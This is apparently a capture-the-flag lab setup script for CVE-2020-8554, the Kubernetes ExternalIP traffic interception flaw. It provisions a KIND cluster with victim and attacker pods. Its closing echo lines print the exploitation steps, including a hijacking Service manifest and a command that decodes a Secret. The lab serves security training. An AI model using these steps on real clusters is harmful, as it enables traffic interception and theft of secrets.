#!/bin/bash
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
CLUSTER_NAME="cve-k8s-22-externalip"

FLAG="${CVE_FLAG:-flag{k8s-22-default}}"
FLAG_DIR="/home/kianabin/cve-flags/k8s-22"
mkdir -p "$FLAG_DIR"
echo "$FLAG" > "$FLAG_DIR/flag.txt"

echo "[K8S-22] CVE-2020-8554 Service ExternalIP Traffic Interception"
echo "[*] Creating KIND cluster..."
kind create cluster --name "$CLUSTER_NAME" --config "$SCRIPT_DIR/kind-config.yaml"

echo "[*] Waiting for cluster stabilization..."
kubectl wait --for=condition=Ready pods --all -n kube-system --timeout=120s 2>/dev/null || true

echo "[*] Pre-loading container images into KIND..."
for img in alpine:latest nginx:1.24-alpine; do
  kind load docker-image $img --name "$CLUSTER_NAME" 2>/dev/null || true
done
sleep 10

echo "[*] Setting up namespaces and RBAC..."
kubectl apply -f - << 'YAML'
---
apiVersion: v1
kind: Namespace
metadata:
  name: secure-ns
---
apiVersion: v1
kind: Namespace
metadata:
  name: attack-ns
---
# Attacker SA with Service creation permissions
apiVersion: v1
kind: ServiceAccount
metadata:
  name: attacker-sa
  namespace: attack-ns
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: service-creator
  namespace: attack-ns
rules:
  - apiGroups: [""]
    resources: ["services"]
    verbs: ["create", "get", "list", "delete"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: service-creator
  namespace: attack-ns
subjects:
  - kind: ServiceAccount
    name: attacker-sa
    namespace: attack-ns
roleRef:
  kind: Role
  name: service-creator
  apiGroup: rbac.authorization.k8s.io
YAML

echo "[*] Creating target service with flag-bearing client..."
# Store flag as a Secret in secure-ns
kubectl create secret generic target-flag -n secure-ns --from-literal=flag="$FLAG" 2>/dev/null || true

kubectl apply -f - << 'YAML'
---
apiVersion: v1
kind: Service
metadata:
  name: internal-api
  namespace: secure-ns
spec:
  selector:
    app: internal-api
  ports:
    - port: 8080
      targetPort: 8080
  type: ClusterIP
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: internal-api
  namespace: secure-ns
spec:
  replicas: 1
  selector:
    matchLabels:
      app: internal-api
  template:
    metadata:
      labels:
        app: internal-api
    spec:
      containers:
        - name: api
          image: nginx:1.24-alpine
          imagePullPolicy: IfNotPresent
          command: ["sh", "-c"]
          args:
            - |
              apk add --no-cache curl >/dev/null 2>&1
              # Periodically send flag-bearing request to itself
              while true; do
                curl -s -H "X-Flag: $FLAG" http://localhost:8080/health 2>/dev/null || true
                sleep 30
              done &
              # Also serve requests
              cat > /etc/nginx/conf.d/default.conf << 'NGINX'
              server {
                listen 8080;
                location /health {
                  return 200 '{"status":"ok"}\n';
                }
                location / {
                  return 200 'API v1.0\n';
                }
              }
              NGINX
              nginx -g 'daemon off;'
          ports:
            - containerPort: 8080
---
# Attacker pod with netcat to capture intercepted traffic
apiVersion: v1
kind: Pod
metadata:
  name: attacker-pod
  namespace: attack-ns
spec:
  serviceAccountName: attacker-sa
  containers:
    - name: attacker
      image: nginx:1.24-alpine
      imagePullPolicy: IfNotPresent
      command: ["sh", "-c"]
      args:
        - |
          apk add --no-cache curl bash >/dev/null 2>&1
          echo "Attacker pod ready - listening for traffic interception..."
          # Set up a simple HTTP listener on port 8080
          cat > /etc/nginx/conf.d/default.conf << 'NGINX'
          server {
            listen 8080;
            location / {
              # Log all intercepted requests including headers
              return 200 'intercepted\n';
            }
          }
          NGINX
          nginx -g 'daemon off;' &
          sleep 3600
      ports:
        - containerPort: 8080
YAML

echo "[*] Waiting for pods..."
kubectl wait --for=condition=Ready pod/attacker-pod -n attack-ns --timeout=120s 2>/dev/null || true
kubectl wait --for=condition=Ready pods -l app=internal-api -n secure-ns --timeout=120s 2>/dev/null || true
sleep 5

# Get the target service's ClusterIP for the hint
TARGET_IP=$(kubectl get svc internal-api -n secure-ns -o jsonpath='{.spec.clusterIP}')
echo ""
echo "[+] K8S-22 ExternalIP Hijack Ready"
echo "    Cluster: $CLUSTER_NAME"
echo "    Target Service ClusterIP: $TARGET_IP"
echo "    Flag Secret: target-flag in secure-ns namespace"
echo "    Flag: $FLAG"
echo ""
echo "    Exploitation steps:"
echo "    1. Discover target service ClusterIP:"
echo "       kubectl get svc --all-namespaces"
echo "    2. Create a malicious service with externalIPs set to the target IP:"
echo "       kubectl apply -f - << 'EOF'"
echo "       apiVersion: v1"
echo "       kind: Service"
echo "       metadata:"
echo "         name: hijack-svc"
echo "         namespace: attack-ns"
echo "       spec:"
echo "         externalIPs:"
echo "           - $TARGET_IP"
echo "         selector:"
echo "           app: attacker"
echo "         ports:"
echo "           - port: 8080"
echo "             targetPort: 8080"
echo "       EOF"
echo "    3. All traffic to $TARGET_IP:8080 now routes to attacker's pods"
echo "    4. Intercept flag-bearing X-Flag header in captured requests"
echo "    5. Or read the flag Secret directly: kubectl get secret target-flag -n secure-ns -o jsonpath='{.data.flag}' | base64 -d"